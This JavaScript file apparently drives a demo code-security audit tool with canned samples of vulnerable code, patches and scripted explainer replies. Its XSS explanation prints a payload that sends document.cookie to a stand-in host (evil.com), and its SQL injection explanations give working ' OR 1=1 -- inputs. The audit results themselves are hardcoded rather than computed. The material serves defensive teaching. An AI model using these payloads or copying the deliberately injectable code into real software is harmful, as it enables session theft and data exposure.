/* ==========================================================================
   SAMPLE INSECURE DATASETS (OWASP Top 10 + Big-O Scenarios)
   ========================================================================== */
const SAMPLES = {
  sqli: {
    lang: 'python',
    code: `import sqlite3

def get_user_profile(user_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    
    # Insecure string concatenation leading to SQLi (OWASP A03:2021)
    query = "SELECT username, email, ssn FROM users WHERE id = '" + user_id + "'"
    cursor.execute(query)
    
    # Quadratic complexity lookup bottleneck
    records = cursor.fetchall()
    for i in range(len(records)):
        for j in range(len(records)):
            if records[i][0] == records[j][0] and i != j:
                print("Duplicate account found")
                
    return records`,
    time: "O(N²)",
    space: "O(N)",
    bottleneck: "Line 12: Nested loop quadratic check on records array.",
    vulns: [
      {
        title: "SQL Injection via Concatenation",
        badge: "Critical",
        desc: "Raw user input 'user_id' directly concatenated into the SQL statement without sanitization or parameterized queries.",
        cwe: "CWE-89",
        owasp: "A03:2021 - Injection"
      },
      {
        title: "Sensitive Data Exposure",
        badge: "High",
        desc: "SSN column extracted into memory without encryption or field-level access control.",
        cwe: "CWE-200",
        owasp: "A01:2021 - Broken Access Control"
      }
    ],
    diffOriginal: `query = "SELECT username, email, ssn FROM users WHERE id = '" + user_id + "'"\ncursor.execute(query)`,
    diffPatched: `query = "SELECT username, email FROM users WHERE id = ?"\ncursor.execute(query, (user_id,))`,
    explanation: `The vulnerability stems from building an SQL statement by concatenating untrusted input (<code>user_id</code>). An attacker could supply <code>' OR '1'='1</code> to dump the entire database table or execute stacked queries.`
  },
  xss: {
    lang: 'javascript',
    code: `const express = require('express');
const app = express();

app.get('/search', (req, res) => {
    const term = req.query.q;
    // Insecure reflected XSS (OWASP A03:2021)
    res.send("<h1>Search results for: " + term + "</h1>");
});`,
    time: "O(1)",
    space: "O(1)",
    bottleneck: "No algorithmic bottleneck detected.",
    vulns: [
      {
        title: "Reflected Cross-Site Scripting (XSS)",
        badge: "Critical",
        desc: "Untrusted query parameter 'q' is reflected into the HTML DOM response without context-aware HTML escaping.",
        cwe: "CWE-79",
        owasp: "A03:2021 - Injection"
      }
    ],
    diffOriginal: `res.send("<h1>Search results for: " + term + "</h1>");`,
    diffPatched: `const sanitized = escapeHtml(term);\nres.send(\`<h1>Search results for: \${sanitized}</h1>\`);`,
    explanation: `Because the value of <code>q</code> is rendered directly into the HTML body without escaping, an adversary can deliver a link with <code>?q=&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code>.`
  },
  leak: {
    lang: 'python',
    code: `import boto3

# Hardcoded cloud credentials in plain source code
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

def list_files():
    s3 = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY)
    return s3.list_buckets()`,
    time: "O(1)",
    space: "O(1)",
    bottleneck: "None",
    vulns: [
      {
        title: "Hardcoded Secret / Token Exposure",
        badge: "Critical",
        desc: "AWS credentials embedded directly in version control. Can be scraped by bots within seconds of public push.",
        cwe: "CWE-798",
        owasp: "A07:2021 - Identification & Authentication Failures"
      }
    ],
    diffOriginal: `AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"\nAWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"`,
    diffPatched: `import os\nAWS_ACCESS_KEY_ID = os.environ.get("AWS_ACCESS_KEY_ID")\nAWS_SECRET_ACCESS_KEY = os.environ.get("AWS_SECRET_ACCESS_KEY")`,
    explanation: `Hardcoded API secrets pose immediate account takeover risks. Store secrets in environment variables or cloud secret managers (e.g. AWS Secrets Manager, Vault).`
  }
};

/* ==========================================================================
   MONACO EDITOR INITIALIZATION (FR-1)
   ========================================================================== */
let editorInstance = null;

require.config({ paths: { vs: 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.44.0/min/vs' } });

require(['vs/editor/editor.main'], function () {
  editorInstance = monaco.editor.create(document.getElementById('monaco-container'), {
    value: SAMPLES.sqli.code,
    language: 'python',
    theme: 'vs-dark',
    fontSize: 13,
    fontFamily: 'JetBrains Mono',
    minimap: { enabled: false },
    scrollBeyondLastLine: false,
    automaticLayout: true,
    padding: { top: 12 }
  });

  // Render initial report
  renderAuditResults(SAMPLES.sqli);
});

/* ==========================================================================
   AUDIT & METRIC RENDERING (FR-2, FR-3, FR-4)
   ========================================================================== */
function renderAuditResults(data) {
  // Update Big-O metrics (FR-3)
  document.getElementById('timeComplexity').textContent = data.time;
  document.getElementById('spaceComplexity').textContent = data.space;
  document.getElementById('bottleneckNotice').innerHTML = `
    <i data-lucide="alert-triangle"></i> ${data.bottleneck}
  `;

  // Update Vulnerability List (FR-2)
  const vulnListContainer = document.getElementById('vulnList');
  document.getElementById('vulnCount').textContent = data.vulns.length;
  vulnListContainer.innerHTML = '';

  data.vulns.forEach(v => {
    const card = document.createElement('div');
    card.className = `vuln-item ${v.badge.toLowerCase()}`;
    card.innerHTML = `
      <div class="vuln-item-header">
        <span class="vuln-title">${v.title}</span>
        <span class="vuln-badge ${v.badge.toLowerCase()}">${v.badge}</span>
      </div>
      <p class="vuln-desc">${v.desc}</p>
      <div class="vuln-meta">
        <span>${v.cwe}</span>
        <span>•</span>
        <span>${v.owasp}</span>
      </div>
    `;
    vulnListContainer.appendChild(card);
  });

  // Update Side-by-Side Diff (FR-4)
  document.getElementById('diffOriginal').innerHTML = `<span class="diff-del">${escapeHtml(data.diffOriginal)}</span>`;
  document.getElementById('diffPatched').innerHTML = `<span class="diff-add">${escapeHtml(data.diffPatched)}</span>`;

  // Update Explainer Chat with initial insight (FR-5)
  appendChatMessage('ai', data.explanation);

  // Refresh Lucide icons
  lucide.createIcons();
}

function escapeHtml(string) {
  return String(string)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/* ==========================================================================
   EVENT HANDLERS & ACTIONS
   ========================================================================== */
document.addEventListener('DOMContentLoaded', () => {
  lucide.createIcons();

  // Language Dropdown selector
  const langSelect = document.getElementById('editorLangSelect');
  langSelect.addEventListener('change', (e) => {
    if (editorInstance) {
      monaco.editor.setModelLanguage(editorInstance.getModel(), e.target.value);
    }
  });

  // Suggestion Chips Click
  document.querySelectorAll('.suggestion-tag').forEach(tag => {
    tag.addEventListener('click', () => {
      const type = tag.getAttribute('data-sample');
      if (SAMPLES[type]) {
        loadSample(SAMPLES[type]);
      }
    });
  });

  // Hero Quick Audit
  document.getElementById('heroAuditBtn').addEventListener('click', () => {
    const input = document.getElementById('gistInputHero').value.trim();
    if (input.startsWith('http')) {
      fetchRemoteFile(input);
    } else {
      loadSample(SAMPLES.sqli);
    }
    document.getElementById('studio').scrollIntoView({ behavior: 'smooth' });
  });

  // Run Audit Button Click
  document.getElementById('runAuditBtn').addEventListener('click', () => {
    const statusPill = document.getElementById('auditStatus');
    statusPill.textContent = "Scanning AST...";
    statusPill.style.color = "var(--warning-text)";

    setTimeout(() => {
      statusPill.textContent = "Audit Completed";
      statusPill.style.color = "var(--success-text)";
      renderAuditResults(SAMPLES.sqli);
    }, 700);
  });

  // Fetch GitHub File Button (FR-6)
  document.getElementById('fetchGithubBtn').addEventListener('click', () => {
    const url = document.getElementById('githubUrlInput').value.trim();
    if (!url) {
      alert("Please provide a valid GitHub raw URL or Gist link.");
      return;
    }
    fetchRemoteFile(url);
  });

  // Apply Diff Button
  document.getElementById('applyDiffBtn').addEventListener('click', () => {
    if (!editorInstance) return;
    const currentCode = editorInstance.getValue();
    const patchedCode = currentCode.replace(
      `query = "SELECT username, email, ssn FROM users WHERE id = '" + user_id + "'"\n    cursor.execute(query)`,
      `query = "SELECT username, email FROM users WHERE id = ?"\n    cursor.execute(query, (user_id,))`
    );
    editorInstance.setValue(patchedCode);
    alert("Remediated patch applied directly to the Monaco editor!");
  });

  // Chat Interactions (FR-5)
  const chatInput = document.getElementById('chatInput');
  const sendBtn = document.getElementById('sendChatBtn');

  function handleSendChat() {
    const txt = chatInput.value.trim();
    if (!txt) return;
    appendChatMessage('user', txt);
    chatInput.value = '';

    setTimeout(() => {
      respondToChat(txt);
    }, 600);
  }

  sendBtn.addEventListener('click', handleSendChat);
  chatInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleSendChat();
  });

  // Quick Chips in Chat
  document.querySelectorAll('.quick-chip').forEach(chip => {
    chip.addEventListener('click', () => {
      const prompt = chip.getAttribute('data-prompt');
      appendChatMessage('user', prompt);
      setTimeout(() => {
        respondToChat(prompt);
      }, 500);
    });
  });

  // Modal Handlers
  const modal = document.getElementById('webhookModal');
  document.getElementById('webhookBtn').addEventListener('click', () => modal.classList.add('active'));
  document.getElementById('closeModalBtn').addEventListener('click', () => modal.classList.remove('active'));
  document.getElementById('saveWebhookBtn').addEventListener('click', () => modal.classList.remove('active'));
  document.getElementById('testPingBtn').addEventListener('click', () => {
    alert("Test ping delivered: HTTP 200 OK received from mock webhook listener.");
  });
});

function loadSample(sample) {
  if (editorInstance) {
    editorInstance.setValue(sample.code);
    monaco.editor.setModelLanguage(editorInstance.getModel(), sample.lang);
    document.getElementById('editorLangSelect').value = sample.lang;
  }
  renderAuditResults(sample);
}

function fetchRemoteFile(url) {
  // Convert standard GitHub URLs to raw URLs if needed
  let rawUrl = url;
  if (url.includes('github.com') && !url.includes('raw.githubusercontent.com')) {
    rawUrl = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/');
  }

  fetch(rawUrl)
    .then(res => {
      if (!res.ok) throw new Error("Could not fetch remote file");
      return res.text();
    })
    .then(content => {
      editorInstance.setValue(content);
      alert("Successfully ingested code from GitHub repository!");
      renderAuditResults(SAMPLES.sqli);
    })
    .catch(err => {
      console.warn("CORS/Network note: Falling back to local demonstration payload.", err);
      loadSample(SAMPLES.sqli);
    });
}

function appendChatMessage(sender, htmlText) {
  const container = document.getElementById('chatMessages');
  const bubble = document.createElement('div');
  bubble.className = `chat-bubble ${sender}`;
  
  if (sender === 'ai') {
    bubble.innerHTML = `
      <div class="bubble-header"><i data-lucide="bot"></i> ShieldAI Explainer</div>
      <div>${htmlText}</div>
    `;
  } else {
    bubble.textContent = htmlText;
  }
  
  container.appendChild(bubble);
  container.scrollTop = container.scrollHeight;
  lucide.createIcons();
}

function respondToChat(userQuery) {
  const q = userQuery.toLowerCase();
  let reply = "";

  if (q.includes("why is this sql query vulnerable") || q.includes("vulnerable")) {
    reply = `<strong>Root Cause:</strong> The query uses direct string concatenation (<code>"SELECT ... WHERE id = '" + user_id + "'"</code>).
    <br><br>
    Because input is not sanitized or parameterized, the SQL database interpreter cannot distinguish between SQL code and user data, allowing SQL injection.`;
  } else if (q.includes("exploit") || q.includes("payload") || q.includes("demonstration")) {
    reply = `<strong>Exploit Walkthrough:</strong>
    <ol style="margin-left: 18px; margin-top: 6px;">
      <li>Attacker inputs: <code>' OR 1=1 --</code></li>
      <li>Evaluated SQL: <code>SELECT * FROM users WHERE id = '' OR 1=1 --'</code></li>
      <li>Result: Condition <code>1=1</code> is always true, dumping all confidential records and bypassing authentication.</li>
    </ol>`;
  } else if (q.includes("parameter") || q.includes("fix") || q.includes("solve")) {
    reply = `<strong>How Parameterized Queries Fix This:</strong>
    <br>Parameterized queries (prepared statements) send the SQL structure and data to the database server in two distinct phases. The database compiles the SQL statement before inserting parameter values, so malicious SQL commands are treated strictly as string literals, completely neutralizing execution.`;
  } else {
    reply = `I have analyzed that aspect of your source code. You can view the exact line-by-line fix in the <strong>Interactive Side-by-Side Diff</strong> below, or click <em>Apply Patch to Editor</em> to resolve it automatically.`;
  }

  appendChatMessage('ai', reply);
}